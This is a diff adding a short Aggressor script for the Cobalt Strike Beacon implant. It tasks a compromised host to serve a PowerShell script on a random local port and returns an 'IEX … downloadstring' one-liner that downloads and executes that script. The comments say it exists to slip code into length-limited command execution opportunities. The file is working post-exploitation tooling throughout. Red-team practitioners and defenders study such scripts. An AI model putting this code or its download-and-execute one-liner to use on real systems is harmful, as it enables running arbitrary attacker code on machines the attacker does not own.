@@ -1,0 +1,45 @@
+# host a PowerShell script on a one-off web server via Beacon.
+# 
+# Why? Generate one-liners for length constrained command execution opportunities
+#
+# NOTE: this uses internal APIs and is subject to break in the next release. Don't hate!
+#       if there's interest in this capability, I can build an official API for it.
+
+import common.*;
+import beacon.*;
+
+# Arguments: beacon id, [code to host]
+# Returns:   a powershell one-liner to download/evaluate that code...
+sub bhost_script {
+	local('$port $builder');
+	$port = [CommonUtils randomPort];
+
+	# build up our command to send to Beacon
+	$builder = [new CommandBuilder];
+	[$builder setCommand: 0x3b];
+	[$builder addShort:   $port];
+	[$builder addString:  $2];
+
+	# task Beacon to run the above command.
+	call("beacons.task", $null, $1, cast([$builder build], 'b'));
+
+	# build and return our PowerShell one-liner
+	return "IEX ((new-object net.webclient).downloadstring('http://127.0.0.1: $+ $port $+ /'))";
+}
+
+# demonstrate how to use the above
+# oneliner [/path/to/file.ps1]
+alias oneliner {
+	local('$handle $data $oneliner');
+
+	# read in the script
+	$handle = openf($2);
+	$data   = readb($handle, -1);
+	closef($handle);
+
+	# task Beacon to host the script, grab the one-liner
+	$oneliner = bhost_script($1, $data);
+
+	# present it to the user
+	blog($1, "Here's a one-liner: $oneliner");
+}
